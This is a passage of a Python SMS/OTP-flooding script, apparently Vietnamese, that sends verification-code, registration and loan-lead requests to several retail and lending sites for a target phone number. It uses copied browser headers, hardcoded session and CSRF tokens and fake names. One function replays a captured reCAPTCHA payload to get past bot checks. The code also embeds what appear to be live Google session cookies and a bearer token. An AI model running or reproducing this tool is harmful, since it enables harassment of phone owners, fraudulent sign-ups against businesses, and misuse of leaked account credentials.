        'DMX_Personal': '%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "TBMCookie_3209819802479625248=894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=beline173|ZqjdK|ZqjdJ; DMX_Personal=%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY",
        'DNT': '1',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    print('thành Công') #("OTP SEND THẾ GIỚ DI ĐỘNG OKE :", response.text)



def send_otp_via_fptshop(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND FPTSHOP:", response.text)



def send_otp_via_WinMart(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'Nguyễn Quang Ngọc',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2024-07-26',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND WinMart:", response.text)

def send_otp_via_vietloan(sdt):
    cookies = {
        '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
        'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_client': 'false',
        'ec_etag_utm': '65518847-15fb-c698-6901-aae49c28ed93',
        'ec_etag_client_utm': 'null',
        'uid': '65518847-15fb-c698-6901-aae49c28ed93',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991; XSRF-TOKEN=eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D; ec_cache_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_png_client=false; ec_png_client_utm=null; ec_etag_client=false; ec_etag_utm=65518847-15fb-c698-6901-aae49c28ed93; ec_etag_client_utm=null; uid=65518847-15fb-c698-6901-aae49c28ed93; client=false; client_utm=null',
        'dnt': '1',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

    print('thành Công') #("OTP SEND vietloan:", response.text)


def send_otp_via_lozi(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://lozi.vn',
        'priority': 'u=1, i',
        'referer': 'https://lozi.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-access-token': 'unknown',
        'x-city-id': '50',
        'x-lozi-client': '1',
    }

    json_data = {
        'countryCode': '84',
        'phoneNumber': sdt,
    }

    response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data)

    print('thành Công') #("OTP SEND lozi:", response.text)



def send_otp_via_F88(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://f88.vn',
        'priority': 'u=1, i',
        'referer': 'https://f88.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'FullName': generate_random_name(),
        'Phone': sdt,
        'DistrictCode': '024',
        'ProvinceCode': '02',
        'AssetType': 'Car',
        'IsChoose': '1',
        'ShopCode': '',
        'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
        'FormType': 1,
    }

    response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND F88:", response.text)




def send_otp_via_spacet(sdt):
    cookies = {
        '__Secure-3PAPISID': 'hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf',
        '__Secure-3PSID': 'g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076',
        'NID': '516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex',
        '__Secure-3PSIDTS': 'sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA',
        '__Secure-3PSIDCC': 'AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-protobuf',
        # 'cookie': '__Secure-3PAPISID=hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf; __Secure-3PSID=g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076; NID=516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex; __Secure-3PSIDTS=sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA; __Secure-3PSIDCC=AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc',
        'dnt': '1',
        'origin': 'https://www.google.com',
        'priority': 'u=1, i',
        'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'k': '6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT',
    }

    data = '\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bð\x01\x18\x01*>\n\b\b\x01\x10Õ\x01\x18ù\x02\n\b\b\x02\x10¬\x8a\x02\x18:\n\x0e\b\x04\x10ç\x8a\x02\x18ù\x01*\x03\x10¸`\n\b\b\x02\x10¤\x93\x05\x18X\n\x0e\b\x04\x10ý\x93\x05\x18\x96\x01*\x03\x10»n'.encode()

    response = requests.post('https://www.google.com/recaptcha/api2/clr', params=params, cookies=cookies, headers=headers, data=data)


    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA',
